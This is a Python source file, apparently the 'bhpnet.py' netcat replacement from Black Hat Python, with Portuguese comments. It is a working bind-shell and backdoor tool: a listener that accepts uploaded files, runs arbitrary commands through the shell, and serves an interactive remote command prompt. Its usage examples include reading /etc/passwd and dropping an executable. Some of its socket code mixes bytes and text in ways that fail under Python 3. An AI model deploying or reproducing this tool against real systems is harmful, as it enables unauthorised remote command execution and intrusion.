#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import socket
import getopt
import threading
import subprocess

listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

def usage():
  print("Usage: bhpnet.py -t target_host -p port \n")
  print("-l --listen \t \t \t - listen on [host]:[port] for incoming connections \n")
  print("-e --execute=file_to_run \t - execute the given file upon receiving a connection \n")
  print("-c --command \t \t \t - initialize a command shell \n")
  print("-u --upload=destination \t - upon receiving connection upload a file and write to [destination] \n \n")
  print("Examples: \n")
  print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c \n")
  print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:/target.exe \n")
  print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\'cat /etc/passwd' \n")
  print("echo 'ABCDEFGHI | ./bhpnet.py -t 192.168.11.12 -p 135'")
  sys.exit(0)

def main():
  global listen
  global port
  global execute
  global command
  global upload_destination
  global target
  
  if not len(sys.argv[1:]):
    usage()
  
  try:
    opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", ["help", "listen", "execute", "target", "port", "command", "upload"])
  except getopt.GetoptError as err:
    print(str(err))
    usage()
  
  for o,a in opts:
    if o in ("-h", "--help"):
      usage()
    elif o in ("-l", "--listen"):
      listen = True
    elif o in ("-e", "--execute"):
      execute = a
    elif o in ("-c", "--command"):
      command = True
    elif o in ("-u", "--upload"):
      upload_destination = a
    elif o in ("-t", "--target"):
      target = a
    elif o in ("-p", "--port"):
      port = int(a)
    else:
      i = 0
      assert False,"Unhandled Option"
  # Iremos ouvir ou simplesmente enviar dados de stdin
  if not listen and len(target) and port > 0:
    # Le o buffer da linha de comando
    # isso causará um bloqueio, portanto envie um CTRL-D se não estiver
    # enviando dados de entrada para stdin
    buffer = sys.stdin.read()
    
    # send data off
    client_sender(buffer)
  
  # Iremos ouvir a porta e, potencialmente.
  # faremos upload de dados, executaremos comando e deixaremos um shell
  # de acordo com as opções de linha de comando anteriores
  
  if listen:
    server_loop()

def server_loop():
  global target
  
  # Se não houver nenhum alvo definido, ouviremos todas as interfaces
  if not len(target):
    target = "0.0.0.0"
    
  server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  server.bind((target,port))
  server.listen(5)
  
  while True:
    client_socket, addr = server.accept()
    
    # Dispara uma thread para o novo client
    client_thread = threading.Thread(target=client_handler, args=(client_socket,))
    client_thread.start()

def client_sender(buffer):
  client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  
  try:
    # conecta-se ao host-alvo
    client.connect((target,port))
    
    if len(buffer):
      client.send(buffer)
      
    while True:
      # Aguardar receber dados de volta
      recv_len = 1
      response = ""
      
      while recv_len:
        data = client.recv(4096)
        recv_len = len(data)
        response += data.decode(errors="ignore")
        
        if recv_len < 4096:
          break
        
      print(response)
      
      # Aguarda mais dados de entrada
      buffer = input("")
      buffer += "\n"
      
      # Envia os dados
      client.send(buffer.encode())
  except:
    print("[*] Exception! Exiting.")
    client.close()

def client_handler(client_socket):
  global upload
  global execute
  global command
  
  if len(upload_destination):
    file_buffer = ""
    
    while True:
      data = client_socket.recv(1024)
      
      if not data:
        break
      else:
        file_buffer += data
    
    try:
      file_descriptor =  open(upload_destination, "wb")
      file_descriptor.write(file_buffer)
      file_descriptor.close()
      
      response = f"Successfully saved file to {upload_destination}"
      client_socket.send(response)
      
    except:
      response = f"Failed to saved file to {upload_destination}"
      client_socket.send(response)
  
  if len(execute):
    output = run_command(execute)
    client_socket.send(output)
    
  if command:
    while True:
      # Exibe um prompt simples
      client_socket.send(b"<BHP:#> ")
      
      # Identifica o fim de um comando quando a tecla enter é pressionada e o executa
      cmd_buffer = ""
      
      while "\n" not in cmd_buffer:
        cmd_buffer += client_socket.recv(1024).decode()
      
      response = run_command(cmd_buffer)
      
      client_socket.send(response)

def run_command(command):
  # Remove a quebra de linha
  command = command.rstrip()
  
  # Executa o comando e obtém os dados de saída
  try:
    output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
  except:
    output = "Failed to execute command. \r\n"
  
  return output

main()

